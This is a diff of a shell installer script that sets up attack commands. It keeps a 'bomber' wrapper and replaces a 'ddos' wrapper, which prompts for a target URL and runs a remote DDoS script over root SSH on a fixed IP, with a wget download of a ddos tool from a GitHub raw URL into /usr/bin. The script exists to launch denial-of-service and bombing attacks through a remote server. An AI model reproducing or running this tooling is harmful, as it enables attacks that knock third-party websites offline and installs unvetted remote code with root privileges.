@@ -18,12 +18,6 @@ sudo echo "ssh -t root@88.99.163.122 -p 50400 sudo /opt/infinite-bomber-reborn/b
 sudo chmod +x /usr/bin/bomber
 
 #run ddos
-sudo touch /usr/bin/ddos
-cat << EOF > /usr/bin/ddos
-#!/bin/bash -e
-read -p 'script version (1 or 2): ' version
-read -p 'url (example: http://breguet.pw): ' url
-ssh -t root@88.99.163.122 -p 50400 python /opt/custom/ddos/ddos$version.py $url
-EOF
-sudo chmod +x /usr/bin/ddos
+sudo wget -P /usr/bin/ https://github.com/l4ckyguy/script/raw/master/ddos
+chmod +x /usr/bin/ddos
 
